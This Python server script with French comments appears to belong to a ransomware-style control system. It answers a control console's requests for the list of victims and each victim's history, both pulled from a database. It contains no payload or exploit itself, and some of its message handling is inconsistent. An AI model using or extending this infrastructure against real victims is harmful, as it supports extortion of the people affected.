import utile.message
import utile.network as network
import utile.data as data
from utile import message
import socket

def main():
    connexion_db = data.connect_db()
    server_socket = network.start_net_serv()

    # Boucle pour maintenir le serveur en écoute indéfiniment
    while True:
        # Accepter une nouvelle connexion
        client_socket, client_address = server_socket.accept()
        print(f"Nouvelle connexion entrante de {client_address}")

        # Insérer le traitement des données ici
        while True:
            # Recevoir le message du client
            message = network.receive_message(client_socket)
            msg_type = utile.message.get_message_type(message)
            if not message:
                break

            # Afficher le message reçu
            print(f"Message du client : {message}")
            if msg_type == 'LIST_VICTIM_REQ':
                print('message reçu')
                victims = data.get_list_victims(connexion_db)

                for victim in victims:
                    message = utile.message.set_message('LIST_VICTIM_RESP', victim)
                    network.send_message(client_socket, message) # Envoie messages list_victime_resp

                # Envoi du message list_victime_end
                message = utile.message.set_message('list_victim_end')
                network.send_message(client_socket, message)

            elif msg_type == 'HISTORY_REQ':
                id_victim = message['HIST_REQ']
                histories = data.get_list_history(connexion_db, id_victim)
                for history in histories:
                    # Envoi des messages history_resp
                    message = utile.message.set_message('history_resp', history)
                    network.send_message(client_socket, message)

                # Envoi du message history_end
                message = utile.message.set_message('history_end', [id_victim])
                network.send_message(client_socket, message)
            else:
                print('Failed ! ')
            # Après avoir traité le message du client, envoyer un message de confirmation à la console de contrôle
            confirmation_message = "Message reçu par le serveur."
            network.send_message(client_socket, confirmation_message.encode('utf-8'))

        # Fermer la connexion avec le client
        client_socket.close()
    # Fermer le socket du serveur une fois que la boucle est terminée
    server_socket.close()
    exit(0)

if __name__ == '__main__':
    main()
